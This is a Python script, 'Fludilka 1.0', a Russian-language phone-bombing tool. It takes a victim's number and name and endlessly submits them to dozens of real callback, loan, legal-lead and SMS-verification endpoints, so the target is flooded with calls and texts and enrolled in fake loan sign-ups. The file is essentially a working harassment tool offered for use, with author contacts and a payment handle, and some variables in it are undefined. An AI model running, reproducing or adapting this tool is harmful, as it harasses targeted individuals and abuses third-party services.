# -*- coding: utf-8 -*-
# Fludilka 1.0
# Author: pentestxr
import requests, random, datetime, sys, time, os, transliterate
from platform import platform

nana = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if nana == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
	delet = 'cls'
	dr = '\\'
else:
	delet = 'clear'
	dr = '/'

banner = """
    ________    __  ______  ______    __ __ ___ 
   / ____/ /   / / / / __ \/  _/ /   / //_//   |
  / /_  / /   / / / / / / // // /   / ,<  / /| |
 / __/ / /___/ /_/ / /_/ // // /___/ /| |/ ___ |
/_/   /_____/\____/_____/___/_____/_/ |_/_/  |_|
                                                
              [by @tg_mysecure]  
"""

os.system(delet)
print(banner)
print('')
print('Здравствуйте. Это флудилка от пентестера.\n[1] - Флуд Звонками\n[2] - Контакты разработчика\n[3] - Выход с программы')
aa = input('Выберите действие: ')

def main():
	os.system(delet)

	print(banner)
	try:
		os.system(delet)
		print(banner)
		global phoneNum
		phoneNum = input('\nНомер телефона (без +): ')
		global name
		name = input('Имя жертвы: ')
		global iteration
		iteration = 0
	except:
		print('Товарищ! Попробуйте еще раз!')
	print('Флуд Звонками запущен! Чтобы остановить его, нажми Ctrl + Z, либо закрой приложение.\nНомер телефона: '+phoneNum)
	while True:
		try:
			truedata = str(datetime.datetime.today())
			truedata = truedata.split (' ')[0]
			names = ('Алексей', 'Иван', 'Константин', 'Петр', 'Семен', 'Матвей', 'Станислав', 'Владимир', 'Олег', 'Сергей')
			surnames = ('Иванов', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев', 'Петров', 'Соколов', 'Михайлов', 'Новиков', 'Фёдоров', 'Морозов', 'Волков')
			patronymics = ('Богданович', 'Маркович', 'Олегович', 'Глебович', 'Александрович', 'Дмитриевич', 'Егорович', 'Георгиевич', 'Львович', 'Кириллович')
			randomemail = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True) + '@gmail.com'
			randompassword = transliterate.translit(random.choice(names),  reversed=True) + transliterate.translit(random.choice(surnames),  reversed=True)
			randomtimezone = int (random.random () * 10)
			randomzaim = int ((random.random () * 10)+10)
			randomid6 = str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))
			problem = 'Здравствуйте, у меня есть проблема'

			if name.strip() == '':
				name = random.choice(names)
			try:
				smart = requests.post('http://smart-lift.com.ua/1.php', data = {'txtname' : name, 'txtphone' : phoneNum, 'valTrFal' : 'valTrFal_true', 'test' : ''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:
				yunker = requests.post ('https://junker.kiev.ua/postmaster.php', data = {'name' : name, 'tel' : phoneNum, 'action' : 'callme'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:
				requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" +phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:
				requests.get(('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=' + phoneNum), data={'host':'register.sipnet.ru',  'origin':'https://www.sipnet.ru',  'referer':'https://www.sipnet.ru/register'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:
				partner = requests.post ('https://www.big-partner.kh.ua/index.php?route=unishop/request/mail', data = {'type' : 'Заказ звонка', 'customername' : name, 'customerphoneNum' : phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:				
				redcaviar = requests.post ('https://red-caviar.biz.ua/order.php', data = {'name' : name, 'phone' : phoneNum, 'meta' : '2'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')
			try:
				requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phoneNum})
				requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phoneNum})
				requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + phoneNum})
				requests.post('https://www.delivery-club.ru/ajax/user_otp', data={'phone': phoneNum})
				requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phoneNum + '/')
				print('Несколько СМС отправлено!')
			except:
				print('СМС не отправлено!')
			try:
				novo = requests.post ('https://novogodneepostelnoe.ru/index.php?route=extension/module/callback', data = {'name' : name, 'phone' : phoneNum, 'comment' : '', 'action' : 'send'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				bistromoney = requests.post ('https://bistrodengi.ru/ajax/lead.php', data = {'fio': name, 'phone': phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				zaymigo = requests.post ('https://zaymigo.com/register', data = {'role' : 'borrower', 'registerphoneNum' : phoneNum, 'password' : randompassword, 'password_confirm' : randompassword, 'register_agreements' : 1, 'register_agreements' : 1, 'timezone' : randomtimezone, 'step' : 1, 'sum' : 10000, 'repayment_method' : 'once', 'period' : 12, 'promoCode' : '', 'appliedPromoCode' : '', 'appliedDiscount' : ''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				zaimexpress = requests.post ('https://www.zaim-express.ru/engine/orders2.php', data = {'type_amount' : 0, 'phone' : phoneNum, 'source' : '', 'clickid' : '', 'webid' : '', 'reffer' : 'www.google.com', 'site' : 'www.zaim-express.ru/'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				zaimi = requests.post ('https://xn--80acmlhv0b.xn--80anhm9e.xn--p1ai/gate/public/api/v1/user/phone', data = {'phone' : phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				moneza = requests.post ('https://www.moneza.ru/ws/public/callback-request', data = {'clientFullName' : name, 'phoneNumber' : phoneNum, 'timezoneOffsetString' : -420})	
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:
				timezaim = requests.post ('https://timezaim.ru/app/', data = {'SUMMA' : randomzaim, 'DAY' : 90, 'TARIFname':'', 'TARIF' : 'main', 'SUM' : '', 'DAYS' : '', 'STEP' : -1, 'main' : 'Y', 'needphoneNum' : phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				carmoney = requests.post ('https://telephony.jivosite.com/api/1/sites/359606/widgets/jbgpFn43Y1/clients/'+str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))+'/telephony/callback', data = {'phone' : phoneNum, 'invitationproblem' : ''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				creditter = requests.post ('https://api.creditter.ru/feedback/phone', json = {'phone': phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				creditplus = requests.post ('https://creditplus.ru/wp-core/wp-admin/admin-ajax.php?action=callbackPhone', data = {'number' : phoneNum, 'confirmation_code' : '', 'action' : 'callbackPhone'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				pliskov = requests.post ('https://telephony.jivosite.com/api/1/sites/6235/widgets/zjrL6mQMKT/clients/'+str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9)) + str(random.randint (1,9))+'/telephony/callback', data = {'phone' : phoneNum, 'invitationproblem' : ''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')		
			try:
				bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': problem,'name': name,'city':'Москва','tel': phoneNum,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': problem,'name': name,'phone': phoneNum,'email':randomemail.lower(),'partner_id':'13'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':phoneNumVodaonline})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+phoneNum,'name': name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': name, 'comment': problem, 'city': 'Москва', 'phoneprefix': '('+phoneNum+')', 'phone': phoneNum, 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': name, 'Phone': phoneNum, 'Description': problem})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': problem,'region': 'Москва','first_lastname': name,'phone': phoneNum,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				pravonedv = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': randomemail.lower(),'phone': phoneNumVodaonline,'location': 'Москва, Россия','name': name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				rdftgbhnj = requests.post('https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback', data={'_wpcf7': '295','_wpcf7_version': '5.0.5','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f295-o2','_wpcf7_container_post': '0','text-838': name,'tel-231': phoneNum,'textarea-472': problem,'hidden-278': 'Главная'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				gurist = requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback', data={'_wpcf7': '3591','_wpcf7_version': '5.0','_wpcf7_locale': 'ru_RU','_wpcf7_unit_tag': 'wpcf7-f3591-o1','_wpcf7_container_post': '0','your-name': name,'tel-147': problem})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				beeline = requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/', data={'leadName':'PodborSim','phone':phoneNum,'region':'98140'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				advokatmakeev = requests.post('https://advokatmakeev.ru/form.php', data={'oname': name,'otel': phoneNumVodaonline,'omail': '','omess': problem,'otype': '1'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				mkamsk = requests.post('http://mkamsk.ru/apply_auto_form', data={'Form[9]': name,'Form[12]': phoneNum,'Form[11]': problem,'url': 'http://mkamsk.ru/','check': 'check'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				usachev = requests.post('https://usachev.vip/wp-admin/admin-ajax.php', data={'action': 'bazz_widget_action','phone': '+'+phoneNum,'name': ''})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				pravosfera = requests.post('http://pravo-sfera.ru/auxpage_zayavk/', data={'cname': name, 'c_tel' : phoneNumVodaonline, 'quest': problem, 'uest_go': 'Задать вопрос'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': name, 'phone': phoneNumVodaonline, 'form-name': 'Заказ обратного звонка'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				lawdivorce = requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php', data={'ip_address': '','ip_country': '','ip_region': '','ip_city': '','url': '','action': 'lld_send_lead','text': problem,'name': name,'telephone': '+'+phoneNumBukvaprava,'city': 'Москва'})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				gosurist = requests.post('http://www.gos-urist.ru/send.php', {'name': name, 'code': phoneNum, 'phone': phoneNum, 'issue': problem})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				ur9911030 = requests.post('http://9911030.ru/orderform.php', {'name': name, 'phone': phoneNum, 'message': problem})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			try:		
				findclone = requests.get('https://findclone.ru/register?phone=' + phoneNum, params={'phone': phoneNum})
				print('Ждите звонка, отправлено!')
			except:
				print('Звонок не отправлен!')	
			iteration += 1
			print('Готово!')
			print('{} круг пройден.'.format(iteration))
		except KeyboardInterrupt:
			print('Остановлено!')

if aa == '1':
	main()
if aa == '2':
	print('=======================\nАвтор: pentestxr\n\nTelegram: @pentestxr\nQIWI: BIGSHOCK\nChannel TG: @tg_mysecure\n=======================')
if aa == '3':
	print('Bye! Check Author!')
	exit(0)